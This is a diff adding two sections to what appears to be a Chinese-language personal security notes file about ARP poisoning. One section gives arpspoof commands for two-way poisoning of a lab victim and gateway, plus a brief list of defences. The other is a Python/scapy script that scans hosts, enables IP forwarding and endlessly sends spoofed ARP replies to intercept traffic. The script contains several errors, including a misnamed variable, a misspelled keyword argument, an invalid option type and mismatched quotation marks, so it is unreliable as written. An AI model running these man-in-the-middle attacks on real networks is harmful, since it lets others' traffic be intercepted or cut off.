@@ -3715,3 +3715,122 @@ if __name__ == '__main__':
 ```
 
 </details>
+
+<details>
+<summary>ARP毒化_arpspoof工具_受害者手机无法上网</summary>
+
+```
+----------------------------------------------------------------------------
+\> arp -a //网关与kali的 iP和MAC
+
+arpspoof [-i 指定网卡] [-t 受害者主机] [-r 伪装的主机IP]
+
+需要同时进行毒化,192.168.61.133为要受害者的主机
+~$ sudo arpspoof -i eth0 -t 192.168.61.133 -r 192.168.61.2
+~$ sudo arpspoof -i eth0 -t 192.168.61.2 -r 192.168.61.133
+
+\> arp -a ////网关与kali的 iP和MAC，但是kali的MAC变成了网关的MAC，这样受害者的主机就无法上网
+
+还需要在kali上进行路由转发，开启路由转发功能
+~$ echo 1 >> /proc/sys/net/ipv4/ip_forward
+
+可以流量捕获之后，放进Wireshark进行分析，然后ARP毒化，完成目标主机与网关之间的双向毒化
+----------------------------------------------------------------------------
+防御策略
+1.使用安全的协议，对数据进行加密
+2.采用静态的ARP表
+3.从物理上或逻辑上对网络进行分段
+4.将共享式设备换成交换式设备
+----------------------------------------------------------------------------
+```
+
+</details>
+
+
+<details>
+<summary>ARP毒化</summary>
+
+```
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+from scapy.all import *
+import re
+import time
+import sys
+import os
+import optparse
+
+lmac = ""     #存放本机的MAC地址
+lip = ""      #存放本机的IP地址
+liveHost = {} #存放存活主机的IP和MAC的字典
+
+# 编写获取存活网络存活主机的IP地址和MAC地址的函数，通过对每一台主机发送ARP数据包并从存活主机的响应包中提取出其IP地址和MAC地址
+def GetAllMAC():
+    scanList  = lip + '/24'
+    try:
+        #通过对每个IP都进行APR广播，获得存活主机的MAC地址
+        ans,unans = srp(Ether(dst='FF:FF:FF:FF:FF:FF')/ARP(pdst=scanList),timeout=2)
+    except Exception as e:
+        print(e)
+    #ARP 广播发送完毕后执行
+    else:
+        #ans 包含存活主机返回的响应包和响应内容
+        for send,rcv in ans:
+            addList = rcv.sprintf('%Ether.src%|%ARP.psrc%')
+            # 把IP当作KEY,MAC当作VAULE存入liveHost字典
+            liveHost[addrList.split('|')[1]] = addList.split('|')[0]
+
+#提取指定IP主机的MAC地址的函数
+def GetOneMAC(targetIP):
+    if targetIP in liveHost.keys():
+        return liveHost[targetIP]
+    else:
+        return 0
+
+#编写ARP毒化函数，对目标主机以及网关不断发送ARP应答包不断毒化
+def poison(targetIP,gatewayIP,ifname):
+    targetMAC = GetOneMAC(targetIP)
+    gatewayMAC = GetOneMAC(gatewayIP)
+
+    if targetMAC and gatewayMAC:
+        while True:
+            sendp(Ether(srcp=lmac,dst=targetMAC)/ARP(hwsrc=lmac,hwdst=targetMAC,psrc=gatewayIP,op=2),
+                iface=ifname,verbose=False)
+
+            sendp(Ether(src=lmac,dst=gatewayMAC)/ARP(hwsrc=lmac,hwdst=gatewayMAC,psrc=targetIP,pdst=gatewayIP,op=2),
+                iface=ifname,verbose=False)
+            time.sleep(1)
+    else:
+        print("目标主机/网关主机IP有误，请检查！“）
+        sys.exit(0)
+
+#编写main函数，添加相关参数以及开启系统路由转发功能
+if __name__ == '__main__':
+    parser = optparse.OptionParser('usage:python %prog -r targetIP -g gatewayIP -i iface \n\n'
+        'Example: python %prog -r 192.168.1.130 -g 192.168.61.254 -i eth0')
+
+    parser.add_option('-r', '--rhost', dest='rhost', default='192.168.1.1', type='strint', help='target host')
+
+    parser.add_option('-g', '--gateway', dest='gateway', default='192.168.1.254', type='strint', help='target gateway')
+
+    parser.add_option('-i', '--iface', dest='iface', default='eth0', type='strint', help='interface name')
+
+    (options, args) = parser.parse_args()
+    lmac = get_if_hwaddr(options.iface)
+    lip = get_if_addr(options.iface)
+    GetAllMAC()
+    print("=== 收集数量: {0}===".format(len(liveHost)))
+    os.system("echo  1 >> /proc/sys/net/ipv4/ip_forward")
+    os.system("sysctl net.ipv4.ip_forward")
+    try:
+        poison(options.rhost, options.gateway, options.iface)
+    except KeyboardInterrupt:
+        os.system("echo 0 >> /proc/sys/net/ipv4/ip_forward")
+        os.system("sysctl net.ipv4.ip_forward")
+
+#运行
+#$ sudo ./ARPpoison.py -r 192.168.61.133 -g 192.168.61.2 -i eth0
+```
+
+</details>
